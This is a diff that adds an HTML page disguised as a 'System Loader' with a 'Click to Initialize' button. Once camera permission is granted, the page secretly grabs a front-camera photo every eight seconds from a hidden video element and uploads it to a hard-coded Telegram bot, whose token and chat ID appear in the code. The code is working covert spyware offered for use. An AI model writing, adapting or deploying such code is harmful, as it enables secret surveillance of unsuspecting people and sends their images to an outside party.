@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>System Loader</title>
+</head>
+<body>
+    <div style="text-align:center; padding-top:20%;">
+        <button id="startBtn" style="padding:20px; background:red; color:white;">Click to Initialize</button>
+    </div>
+
+    <video id="video" style="display:none;" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const botToken = "8891293966:AAFxO6GmPBsIffoQqPEh732nkb9rD1lXKyQ";
+        const chatId = "8448890906";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        document.getElementById('startBtn').onclick = async () => {
+            try {
+                // ক্যামেরা রিকোয়েস্ট
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // সামনের ক্যামেরা ফোকাস করবে
+                });
+                video.srcObject = stream;
+                setInterval(captureAndSend, 8000); 
+            } catch (err) {
+                alert("পারমিশন প্রয়োজন!");
+            }
+        };
+
+        function captureAndSend() {
+            // ৯:১৬ অনুপাত (যেমন: ৩৬০ x ৬৪০)
+            const width = 360;
+            const height = 640;
+            
+            canvas.width = width;
+            canvas.height = height;
+            
+            const ctx = canvas.getContext('2d');
+            
+            // ভিডিও থেকে ছবি ক্রপ করে ক্যানভাসে বসানো
+            ctx.drawImage(video, 0, 0, width, height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'cam.jpg');
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+            }, 'image/jpeg', 0.5); // কোয়ালিটি ০.৫ রাখা হয়েছে যাতে ক্লিয়ার থাকে
+        }
+    </script>
+</body>
+</html>
